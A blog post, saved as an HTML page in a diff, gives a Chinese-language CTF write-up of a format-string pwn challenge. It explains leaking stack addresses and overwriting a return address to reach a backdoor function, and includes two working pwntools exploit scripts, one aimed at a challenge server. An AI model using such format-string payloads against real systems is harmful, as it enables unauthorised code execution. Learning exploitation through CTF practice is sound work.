@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.1.1">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"whoamiuu.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="week1-Format-String一、程序分析   有三次输入机会，向 buf 输入256字节，并且 printf 将 buf 当作参数，明显格式化字符串漏洞。因为没有 pie，尝试将返回地址修改为后门函数 二、调试过程在第一次输入时打断  可以看到返回地址为 0x4012ba 输入多个 %p 查看  第九个参数就是返回地址，我们需要通过 %c 和 %n 把这里修改为backdoor 地址 0">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF题解：Format String">
+<meta property="og:url" content="http://whoamiuu.github.io/2025/12/14/2025-12-14-week1-Format%20String/index.html">
+<meta property="og:site_name" content="Learn Blogs">
+<meta property="og:description" content="week1-Format-String一、程序分析   有三次输入机会，向 buf 输入256字节，并且 printf 将 buf 当作参数，明显格式化字符串漏洞。因为没有 pie，尝试将返回地址修改为后门函数 二、调试过程在第一次输入时打断  可以看到返回地址为 0x4012ba 输入多个 %p 查看  第九个参数就是返回地址，我们需要通过 %c 和 %n 把这里修改为backdoor 地址 0">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://whoamiuu.github.io/images/25-12-14-pwn4-Format-String/checksec.png">
+<meta property="og:image" content="http://whoamiuu.github.io/images/25-12-14-pwn4-Format-String/vuln.png">
+<meta property="og:image" content="http://whoamiuu.github.io/images/25-12-14-pwn4-Format-String/backdoor.png">
+<meta property="og:image" content="http://whoamiuu.github.io/images/25-12-14-pwn4-Format-String/stack.png">
+<meta property="og:image" content="http://whoamiuu.github.io/images/25-12-14-pwn4-Format-String/%25p.png">
+<meta property="article:published_time" content="2025-12-14T11:29:00.000Z">
+<meta property="article:modified_time" content="2025-12-16T03:20:57.480Z">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="shellcode">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://whoamiuu.github.io/images/25-12-14-pwn4-Format-String/checksec.png">
+
+
+<link rel="canonical" href="http://whoamiuu.github.io/2025/12/14/2025-12-14-week1-Format%20String/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://whoamiuu.github.io/2025/12/14/2025-12-14-week1-Format%20String/","path":"2025/12/14/2025-12-14-week1-Format String/","title":"CTF题解：Format String"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>CTF题解：Format String | Learn Blogs</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Learn Blogs</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">二进制安全学习笔记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#week1-Format-String"><span class="nav-number">1.</span> <span class="nav-text">week1-Format-String</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="nav-number">1.1.</span> <span class="nav-text">一、程序分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B"><span class="nav-number">1.2.</span> <span class="nav-text">二、调试过程</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name"></p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://whoamiuu.github.io/2025/12/14/2025-12-14-week1-Format%20String/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Learn Blogs">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="CTF题解：Format String | Learn Blogs">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CTF题解：Format String
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2025-12-14 19:29:00" itemprop="dateCreated datePublished" datetime="2025-12-14T19:29:00+08:00">2025-12-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2025-12-16 11:20:57" itemprop="dateModified" datetime="2025-12-16T11:20:57+08:00">2025-12-16</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Writeup/" itemprop="url" rel="index"><span itemprop="name">Writeup</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="week1-Format-String"><a href="#week1-Format-String" class="headerlink" title="week1-Format-String"></a>week1-Format-String</h1><h2 id="一、程序分析"><a href="#一、程序分析" class="headerlink" title="一、程序分析"></a>一、程序分析</h2><p><img src="/images/25-12-14-pwn4-Format-String/checksec.png" alt="image-20251214104847251"></p>
+<p><img src="/images/25-12-14-pwn4-Format-String/vuln.png" alt="image-20251214105053214"></p>
+<p><img src="/images/25-12-14-pwn4-Format-String/backdoor.png" alt="image-20251214194047129"></p>
+<p>有三次输入机会，向 buf 输入256字节，并且 printf 将 buf 当作参数，明显格式化字符串漏洞。因为没有 pie，尝试将返回地址修改为后门函数</p>
+<h2 id="二、调试过程"><a href="#二、调试过程" class="headerlink" title="二、调试过程"></a>二、调试过程</h2><p>在第一次输入时打断</p>
+<p><img src="/images/25-12-14-pwn4-Format-String/stack.png" alt="image-20251214105559934"></p>
+<p>可以看到返回地址为 0x4012ba</p>
+<p>输入多个 %p 查看</p>
+<p><img src="/images/25-12-14-pwn4-Format-String/%25p.png" alt="屏幕截图 2025-12-14 105725"></p>
+<p>第九个参数就是返回地址，我们需要通过 %c 和 %n 把这里修改为backdoor 地址 0x401205，并且只需要修改最低字节就可以</p>
+<p>因为 %n 是向对应地址写入，我们希望向 0x4012ba 对应的栈地址写入，但是通过泄露的数据可以看到，没有指向 0x4012ba 的地址0x7fffffffde18。</p>
+<p>再观察一下可以发现，我们能够修改 rbp 指向的值 0x7fffffffde20，将其最低字节覆盖为 0x18，这样就可以让 0x7fffffffde18出现在栈上，</p>
+<p>然后再一次通过 %n 写返回地址即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&quot;%p.&quot;</span>*<span class="number">20</span> + <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">sh.recvuntil(<span class="string">b&quot;You have 3 chances.\n&quot;</span>)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line">rbp = sh.recvuntil(<span class="string">b&#x27;\n&#x27;</span>).split(<span class="string">b&#x27;.&#x27;</span>)[<span class="number">5</span>]</span><br><span class="line"><span class="built_in">print</span>(rbp) <span class="comment">#泄露栈地址</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">stack_byte = <span class="number">0x08</span> + <span class="built_in">int</span>(rbp[-<span class="number">2</span>:], <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_byte))</span><br><span class="line">payload2 = <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(stack_byte).encode() + <span class="string">b&quot;c%6$hhn&quot;</span> <span class="comment">#写指向返回地址的栈地址</span></span><br><span class="line">sh.recvuntil(<span class="string">b&quot;You have 2 chances.\n&quot;</span>)</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">return_byte = <span class="number">0x05</span></span><br><span class="line">payload3 = <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(return_byte).encode() + <span class="string">b&quot;c%8$hhn&quot;</span> <span class="comment">#写返回地址</span></span><br><span class="line">sh.recvuntil(<span class="string">b&quot;You have 1 chances.\n&quot;</span>)</span><br><span class="line">sh.sendline(payload3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>这里再学习一下更好的exp写法：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;154.94.237.159&#x27;</span>, <span class="number">34859</span>)</span><br><span class="line"><span class="comment">#sh = process(&#x27;./pwn&#x27;)  </span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&quot;You have 3 chances.\n&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;%8$p&#x27;</span>)  <span class="comment">#直接取对应参数，减少错误</span></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">stack_leak = <span class="built_in">int</span>(sh.recv(<span class="number">12</span>), <span class="number">16</span>) <span class="comment">#接收12个字符，不算0x前缀，转化成整数</span></span><br><span class="line">log.success(<span class="string">f&quot;Stack leak: <span class="subst">&#123;<span class="built_in">hex</span>(stack_leak)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">target_addr = stack_leak - <span class="number">8</span></span><br><span class="line">log.info(<span class="string">f&quot;Target address: <span class="subst">&#123;<span class="built_in">hex</span>(target_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&quot;You have 2 chances.\n&quot;</span>)</span><br><span class="line">payload2 = <span class="string">f&quot;%<span class="subst">&#123;target_addr &amp; <span class="number">0xffff</span>&#125;</span>c%15$hn&quot;</span>.encode() <span class="comment">#表面看是&quot;对十进制数取低16位&quot;，但实际上底层是对二进制表示进行操作，可以得到正确的结果。</span></span><br><span class="line">sh.sendline(payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&quot;You have 1 chances.\n&quot;</span>)</span><br><span class="line">bkd = <span class="number">0x401205</span></span><br><span class="line">payload3 = <span class="string">f&quot;%<span class="subst">&#123;bkd &amp; <span class="number">0xffff</span>&#125;</span>c%45$hn&quot;</span>.encode() <span class="comment">#这里注意用.encode()转化成字节</span></span><br><span class="line">sh.sendline(payload3)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+              <a href="/tags/shellcode/" rel="tag"># shellcode</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/12/10/2025-12-16-Vuln-Random-Seed/" rel="prev" title="CTF题解：vuln">
+                  <i class="fa fa-angle-left"></i> CTF题解：vuln
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2026/01/29/2026-01-29-ret2dlsolve%E6%8A%80%E6%9C%AF/" rel="next" title="CTF题解：ret2dlsolve 技术">
+                  CTF题解：ret2dlsolve 技术 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder"></span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
